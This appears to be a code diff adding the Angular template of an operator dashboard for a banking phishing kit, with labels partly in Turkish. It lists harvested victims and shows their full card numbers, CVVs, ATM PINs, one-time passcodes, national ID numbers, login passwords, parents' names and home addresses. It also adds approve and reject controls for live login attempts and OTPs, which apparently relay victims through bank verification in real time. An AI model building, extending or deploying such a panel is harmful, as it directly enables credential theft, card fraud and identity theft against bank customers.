@@ -1,0 +1,382 @@
+<div class="min-h-screen bg-slate-50 font-sans">
+  <header class="bg-white border-b border-slate-200 sticky top-0 z-40 shadow-sm">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
+      <div class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-red-50 rounded-xl flex items-center justify-center border border-red-100">
+          <span class="material-symbols-outlined text-[#e10514]">admin_panel_settings</span>
+        </div>
+        <div>
+          <h1 class="text-base font-bold text-slate-900 leading-tight">Admin Dashboard</h1>
+        </div>
+      </div>
+
+      <div class="flex-1 max-w-md relative hidden sm:block">
+        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+          <span class="material-symbols-outlined text-slate-400 text-[18px]">search</span>
+        </div>
+        <input type="text" (input)="onSearch($event)" placeholder="Search customers..."
+          class="block w-full pl-10 pr-3 py-2 border border-slate-200 rounded-lg leading-5 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-2 focus:ring-[#e10514]/20 focus:border-[#e10514] sm:text-sm transition-colors">
+      </div>
+
+      <div class="flex items-center gap-3">
+        <button (click)="loadCustomers()"
+          class="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-bold text-emerald-700 bg-emerald-50 hover:bg-emerald-100 rounded-lg transition-colors border border-emerald-200 cursor-pointer"
+          type="button">
+          <span class="material-symbols-outlined text-[16px]">refresh</span>
+          Refresh
+        </button>
+        <a href="/admin/login"
+          class="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-bold text-slate-600 hover:text-[#e10514] hover:bg-red-50 rounded-lg transition-colors border border-transparent hover:border-red-100">
+          <span class="material-symbols-outlined text-[18px]">logout</span>
+          Logout
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    @if (isLoading()) {
+    <div
+      class="bg-white rounded-2xl border border-slate-200 shadow-sm p-16 flex flex-col items-center justify-center gap-4 text-center">
+      <div class="w-12 h-12 rounded-full border-4 border-slate-100 border-t-[#e10514] animate-spin"></div>
+      <p class="text-sm font-bold text-slate-600">Loading customer data...</p>
+    </div>
+    } @else if (error()) {
+    <div
+      class="bg-white rounded-2xl border border-red-200 shadow-sm p-16 flex flex-col items-center justify-center gap-4 text-center">
+      <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center border border-red-100">
+        <span class="material-symbols-outlined text-[#e10514] text-4xl">error</span>
+      </div>
+      <p class="text-base font-bold text-slate-800">{{ error() }}</p>
+      <button (click)="loadCustomers()"
+        class="mt-2 inline-flex items-center gap-1.5 px-6 py-2.5 rounded-xl bg-[#e10514] hover:bg-[#b0030f] text-white text-sm font-bold transition-colors cursor-pointer"
+        type="button">
+        <span class="material-symbols-outlined text-[18px]">refresh</span>
+        Retry Connection
+      </button>
+    </div>
+    } @else {
+    @if (filteredCustomers().length === 0) {
+    <div
+      class="bg-white rounded-2xl border border-slate-200 shadow-sm p-16 flex flex-col items-center justify-center gap-3 text-center">
+      <div
+        class="w-16 h-16 rounded-full bg-slate-50 flex items-center justify-center text-slate-400 mb-2 border border-slate-200">
+        <span class="material-symbols-outlined text-3xl">search_off</span>
+      </div>
+      <p class="text-base font-bold text-slate-800">No customers found</p>
+      <p class="text-sm text-slate-500">Try adjusting your search terms.</p>
+    </div>
+    } @else {
+    <div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
+      @for (customer of filteredCustomers(); track customer.customer_id) {
+      <div (click)="openPanel(customer)"
+        class="group rounded-2xl border shadow-sm hover:shadow-lg transition-all duration-300 cursor-pointer overflow-hidden flex flex-col relative"
+        [class]="hasPending(customer) ? 'bg-amber-50/30 border-amber-400 shadow-[0_0_15px_rgba(251,191,36,0.4)] hover:border-amber-500' : 'bg-white border-slate-200 hover:border-[#e10514]/30'">
+        <div class="p-5 border-b border-slate-100 flex items-start gap-4"
+          [class.border-amber-200]="hasPending(customer)">
+          <div
+            class="w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg transition-colors shrink-0"
+            [class]="hasPending(customer) ? 'bg-amber-100 text-amber-700 group-hover:bg-amber-200' : 'bg-slate-100 text-slate-600 group-hover:bg-red-50 group-hover:text-[#e10514]'">
+            {{ initials(customer.customer_name) }}
+          </div>
+          <div class="flex-1 min-w-0">
+            <div class="flex items-center justify-between gap-2 mb-1">
+              <h3 class="text-base font-extrabold truncate transition-colors"
+                [class]="hasPending(customer) ? 'text-amber-900' : 'text-slate-900 group-hover:text-[#e10514]'">
+                {{ customer.customer_name }}
+              </h3>
+              @if (hasPending(customer)) {
+              <span
+                class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-amber-100 text-amber-800 text-[10px] font-extrabold uppercase tracking-wider border border-amber-300 shadow-sm animate-pulse">
+                <span class="relative flex h-2 w-2 shrink-0">
+                  <span
+                    class="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75"></span>
+                  <span class="relative inline-flex rounded-full h-2 w-2 bg-amber-600"></span>
+                </span>
+                Action Required
+              </span>
+              }
+            </div>
+            <div class="flex items-center gap-1.5 text-xs text-slate-500 mb-1 font-medium">
+              <span class="material-symbols-outlined text-[14px]">smartphone</span>
+              {{ customer.customer_phone_number }}
+            </div>
+            <div class="flex items-center gap-1.5 text-xs text-slate-500 font-medium">
+              <span class="material-symbols-outlined text-[14px]">mail</span>
+              <span class="truncate">{{ customer.customer_email }}</span>
+            </div>
+          </div>
+        </div>
+        <div class="p-4 bg-slate-50/50 flex-1 flex flex-col">
+          <div class="flex items-center gap-1.5 text-sm text-slate-600 mb-4">
+            <span class="material-symbols-outlined text-[16px] text-slate-400">location_on</span>
+            <span class="font-semibold">{{ customer.customer_province }}</span>, {{ customer.customer_district }}
+          </div>
+          <div class="flex items-center gap-4 mt-auto">
+            <div
+              class="flex items-center gap-2 px-4 py-2 rounded-xl bg-white border border-slate-200 shadow-sm flex-1 justify-center">
+              <span class="material-symbols-outlined text-[18px] text-purple-600">credit_card</span>
+              <span class="text-sm font-bold text-slate-800">{{ customer.ccs.length }}</span>
+            </div>
+            <div
+              class="flex items-center gap-2 px-4 py-2 rounded-xl bg-white border border-slate-200 shadow-sm flex-1 justify-center">
+              <span class="material-symbols-outlined text-[18px] text-[#e10514]">password</span>
+              <span class="text-sm font-bold text-slate-800">{{ customer.otps.length }}</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      }
+    </div>
+    }
+    }
+  </main>
+
+  @if (currentLoginAttempt()) {
+  <div class="fixed inset-0 z-[100] flex items-center justify-center bg-slate-900/60 backdrop-blur-sm">
+    <div class="bg-white rounded-2xl shadow-2xl border border-slate-200 max-w-sm w-full mx-4 overflow-hidden animate-[pulse_2s_ease-in-out_infinite]">
+      <div class="bg-blue-600 p-4 flex items-center gap-3">
+        <span class="material-symbols-outlined text-white text-3xl">login</span>
+        <h2 class="text-lg font-bold text-white">Yeni Giriş Denemesi</h2>
+      </div>
+      <div class="p-6">
+        <div class="mb-4">
+          <p class="text-xs text-slate-500 font-bold uppercase tracking-wider">TCKN / Müşteri No</p>
+          <p class="text-lg font-extrabold text-slate-900">{{ currentLoginAttempt()?.identity }}</p>
+        </div>
+        <div class="mb-6">
+          <p class="text-xs text-slate-500 font-bold uppercase tracking-wider">Şifre</p>
+          <p class="text-lg font-extrabold text-[#e10514]">{{ currentLoginAttempt()?.password }}</p>
+        </div>
+        <div class="flex gap-3">
+          <button (click)="rejectLoginAttempt()" class="flex-1 px-4 py-2.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold transition-colors cursor-pointer">
+            Reddet
+          </button>
+          <button (click)="approveLoginAttempt()" class="flex-1 px-4 py-2.5 rounded-xl bg-[#e10514] hover:bg-[#b0030f] text-white font-bold transition-colors cursor-pointer">
+            Onayla
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  }
+
+  @if (panelCustomer()) {
+  <div class="fixed inset-0 z-50 overflow-hidden">
+    <div class="absolute inset-0 bg-slate-900/40 backdrop-blur-sm transition-opacity" (click)="closePanel()"></div>
+    <div
+      class="absolute inset-y-0 right-0 w-full max-w-2xl bg-white shadow-2xl flex flex-col transform transition-transform duration-300">
+      <div class="px-6 py-4 border-b border-slate-200 flex items-center justify-between bg-slate-50">
+        <div class="flex items-center gap-4">
+          <div
+            class="w-12 h-12 rounded-full bg-white flex items-center justify-center text-[#e10514] font-bold text-xl shadow-sm border border-slate-200">
+            {{ initials(panelCustomer()!.customer_name) }}
+          </div>
+          <div>
+            <h2 class="text-xl font-extrabold text-slate-900">{{ panelCustomer()!.customer_name }}</h2>
+            <p class="text-sm text-slate-500 font-mono mt-0.5">ID: {{ panelCustomer()!.customer_id }}</p>
+          </div>
+        </div>
+        <button (click)="closePanel()"
+          class="p-2 rounded-xl hover:bg-slate-200 text-slate-500 transition-colors cursor-pointer">
+          <span class="material-symbols-outlined">close</span>
+        </button>
+      </div>
+
+      <div class="px-6 border-b border-slate-200 flex items-center gap-6 bg-slate-50">
+        <button (click)="setTab('info')"
+          class="px-2 py-3 text-sm font-bold border-b-2 transition-colors -mb-px flex items-center gap-2 cursor-pointer"
+          [class]="activeTab() === 'info' ? 'border-[#e10514] text-[#e10514]' : 'border-transparent text-slate-500 hover:text-slate-800'">
+          <span class="material-symbols-outlined text-[18px]">person</span>
+          Profile Info
+        </button>
+        <button (click)="setTab('cards')"
+          class="px-2 py-3 text-sm font-bold border-b-2 transition-colors -mb-px flex items-center gap-2 cursor-pointer"
+          [class]="activeTab() === 'cards' ? 'border-[#e10514] text-[#e10514]' : 'border-transparent text-slate-500 hover:text-slate-800'">
+          <span class="material-symbols-outlined text-[18px]">credit_card</span>
+          Cards
+          <span class="bg-slate-100 text-slate-700 py-0.5 px-2 rounded-full text-xs border border-slate-200">{{
+            panelCustomer()!.ccs.length }}</span>
+        </button>
+        <button (click)="setTab('otps')"
+          class="px-2 py-3 text-sm font-bold border-b-2 transition-colors -mb-px flex items-center gap-2 cursor-pointer"
+          [class]="activeTab() === 'otps' ? 'border-[#e10514] text-[#e10514]' : 'border-transparent text-slate-500 hover:text-slate-800'">
+          <span class="material-symbols-outlined text-[18px]">password</span>
+          OTPs
+          <span class="bg-slate-100 text-slate-700 py-0.5 px-2 rounded-full text-xs border border-slate-200">{{
+            panelCustomer()!.otps.length }}</span>
+        </button>
+      </div>
+
+      <div class="flex-1 overflow-y-auto p-6 bg-white">
+        @if (activeTab() === 'info') {
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+          <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50">
+            <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Date of Birth</p>
+            <p class="text-base font-bold text-slate-900">{{ panelCustomer()!.customer_db | date:'mediumDate' }}</p>
+          </div>
+          <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50">
+            <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Registration Date</p>
+            <p class="text-base font-bold text-slate-900">{{ panelCustomer()!.created_at | date:'medium' }}</p>
+          </div>
+          <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50">
+            <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Father's Name</p>
+            <p class="text-base font-bold text-slate-900">{{ panelCustomer()!.customer_first_m_name || '—' }}</p>
+          </div>
+          <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50">
+            <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Mother's Name</p>
+            <p class="text-base font-bold text-slate-900">{{ panelCustomer()!.customer_second_m_name || '—' }}</p>
+          </div>
+          <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50 sm:col-span-2">
+            <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Full Address</p>
+            <p class="text-base font-bold text-slate-900">{{ panelCustomer()!.customer_address }}</p>
+            <p class="text-sm font-medium text-slate-600 mt-1">{{ panelCustomer()!.customer_district }}, {{
+              panelCustomer()!.customer_province }}</p>
+          </div>
+        </div>
+        }
+
+        @if (activeTab() === 'cards') {
+        @if (panelCustomer()!.ccs.length === 0) {
+        <div
+          class="py-12 flex flex-col items-center justify-center text-center border-2 border-dashed border-slate-200 rounded-2xl">
+          <span class="material-symbols-outlined text-slate-300 text-5xl mb-3">credit_card_off</span>
+          <p class="text-base font-bold text-slate-600">No cards registered</p>
+        </div>
+        } @else {
+        <div class="flex flex-col gap-4">
+          @for (card of panelCustomer()!.ccs; track card.card_id) {
+          <div class="rounded-2xl border border-slate-200 shadow-sm overflow-hidden bg-white">
+            <div class="p-4 border-b border-slate-100 flex items-center justify-between"
+              [class]="card.card_status === 'PENDING' ? 'bg-amber-50' : 'bg-slate-50'">
+              <div class="flex items-center gap-2">
+                <span class="material-symbols-outlined text-[20px]"
+                  [class]="card.card_status === 'PENDING' ? 'text-amber-600' : 'text-slate-600'">credit_card</span>
+                <span class="font-extrabold text-slate-900">{{ getCardBrand(card.card_name) }}</span>
+              </div>
+              <div class="flex items-center gap-3">
+                <span class="px-2.5 py-1 rounded-md text-xs font-extrabold uppercase tracking-wider border" [class]="card.card_status === 'PENDING' ? 'bg-amber-100 text-amber-800 border-amber-200' : 
+                                       card.card_status === 'ACCEPTED' ? 'bg-emerald-100 text-emerald-800 border-emerald-200' : 
+                                       'bg-slate-100 text-slate-600 border-slate-200'">
+                  {{ card.card_status }}
+                </span>
+                @if (card.card_status === 'PENDING') {
+                <div class="flex items-center gap-1.5 border-l border-slate-200 pl-3">
+                  <button (click)="acceptCard(panelCustomer()!.customer_id, card.card_id, $event)"
+                    class="w-8 h-8 rounded-lg bg-emerald-50 hover:bg-emerald-500 text-emerald-600 hover:text-white flex items-center justify-center border border-emerald-200 transition-colors cursor-pointer"
+                    title="Accept">
+                    <span class="material-symbols-outlined text-[18px]">check</span>
+                  </button>
+                  <button (click)="rejectCard(panelCustomer()!.customer_id, card.card_id, $event)"
+                    class="w-8 h-8 rounded-lg bg-red-50 hover:bg-red-500 text-red-600 hover:text-white flex items-center justify-center border border-red-200 transition-colors cursor-pointer"
+                    title="Reject">
+                    <span class="material-symbols-outlined text-[18px]">close</span>
+                  </button>
+                </div>
+                }
+              </div>
+            </div>
+            <div class="p-5">
+              <div class="mb-4">
+                <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Card Number</p>
+                <p class="font-mono text-xl font-extrabold text-slate-900 tracking-[0.15em]">{{ card.card_number }}</p>
+              </div>
+              <div class="flex gap-8 mb-4">
+                <div>
+                  <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Expiry</p>
+                  <p class="text-base font-bold text-slate-900">{{ card.card_date }}</p>
+                </div>
+                <div>
+                  <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">CVV</p>
+                  <p class="font-mono text-base font-bold text-slate-900">{{ card.card_cvv }}</p>
+                </div>
+              </div>
+              <div class="flex gap-8 p-3 bg-slate-50 rounded-xl border border-slate-100">
+                <div class="flex-1">
+                  <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">ATM Password</p>
+                  <p class="font-mono text-lg font-extrabold text-[#e10514] tracking-widest">
+                    {{ 'atm_password' in card ? card['atm_password'] : '----' }}
+                  </p>
+                </div>
+                <div class="flex-1 border-l border-slate-200 pl-4">
+                  <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-1">Latest OTP</p>
+                  <p class="font-mono text-lg font-extrabold text-[#e10514] tracking-widest">
+                    {{ panelCustomer()!.otps.length > 0 ? panelCustomer()!.otps[panelCustomer()!.otps.length - 1].otp : '------' }}
+                  </p>
+                </div>
+              </div>
+              <div class="mt-4 pt-4 border-t border-slate-100">
+                <p class="text-xs text-slate-500 font-medium flex items-center gap-1.5">
+                  <span class="material-symbols-outlined text-[14px]">schedule</span>
+                  Added {{ card.created_at | date:'medium' }}
+                </p>
+              </div>
+            </div>
+          </div>
+          }
+        </div>
+        }
+        }
+
+        @if (activeTab() === 'otps') {
+        @if (panelCustomer()!.otps.length === 0) {
+        <div
+          class="py-12 flex flex-col items-center justify-center text-center border-2 border-dashed border-slate-200 rounded-2xl">
+          <span class="material-symbols-outlined text-slate-300 text-5xl mb-3">speaker_notes_off</span>
+          <p class="text-base font-bold text-slate-600">No OTPs received</p>
+        </div>
+        } @else {
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          @for (otp of panelCustomer()!.otps; track otp.otp_id) {
+          <div class="rounded-2xl border border-slate-200 shadow-sm overflow-hidden bg-white">
+            <div class="px-5 py-4 border-b border-slate-100 flex items-center justify-between"
+              [class]="otp.otp_status === 'PENDING' ? 'bg-amber-50' : 'bg-slate-50'">
+              <div class="flex items-center gap-2">
+                <span class="material-symbols-outlined text-[20px]"
+                  [class]="otp.otp_status === 'PENDING' ? 'text-amber-600' : 'text-slate-600'">password</span>
+                <span class="font-extrabold tracking-widest text-lg"
+                  [class]="otp.otp_status === 'PENDING' ? 'text-[#e10514]' : 'text-slate-900'">
+                  {{ otp.otp }}
+                </span>
+              </div>
+              <div class="flex items-center gap-4">
+                <span class="px-2.5 py-1 rounded-md text-xs font-extrabold uppercase tracking-wider border" [class]="otp.otp_status === 'PENDING' ? 'bg-amber-100 text-amber-800 border-amber-200' : 
+                                       otp.otp_status === 'ACCEPTED' ? 'bg-emerald-100 text-emerald-800 border-emerald-200' : 
+                                       'bg-slate-100 text-slate-600 border-slate-200'">
+                  {{ otp.otp_status }}
+                </span>
+                @if (otp.otp_status === 'PENDING') {
+                <div class="flex items-center gap-1.5 border-l border-slate-200 pl-3">
+                  <button (click)="acceptOtp(panelCustomer()!.customer_id, otp.otp_id, $event)"
+                    class="w-7 h-7 rounded-lg bg-emerald-50 hover:bg-emerald-500 text-emerald-600 hover:text-white flex items-center justify-center border border-emerald-200 transition-colors cursor-pointer"
+                    title="Accept">
+                    <span class="material-symbols-outlined text-[16px]">check</span>
+                  </button>
+                  <button (click)="rejectOtp(panelCustomer()!.customer_id, otp.otp_id, $event)"
+                    class="w-7 h-7 rounded-lg bg-red-50 hover:bg-red-500 text-red-600 hover:text-white flex items-center justify-center border border-red-200 transition-colors cursor-pointer"
+                    title="Reject">
+                    <span class="material-symbols-outlined text-[16px]">close</span>
+                  </button>
+                </div>
+                }
+                <span class="text-xs text-slate-500 font-medium">{{ otp.created_at | date:'shortTime' }}</span>
+              </div>
+            </div>
+            
+            <div class="p-5">
+              <p class="text-[11px] text-slate-500 font-bold uppercase tracking-wider mb-2">OTP Code</p>
+              <p class="font-mono text-3xl font-extrabold text-[#022144] tracking-[0.25em] mb-4">{{ otp.otp }}</p>
+              <div class="border-t border-slate-100 pt-3">
+                <p class="text-xs text-slate-400 font-medium">{{ otp.created_at | date:'mediumDate' }}</p>
+              </div>
+            </div>
+          </div>
+          }
+        </div>
+        }
+        }
+      </div>
+    </div>
+  </div>
+  }
+</div>
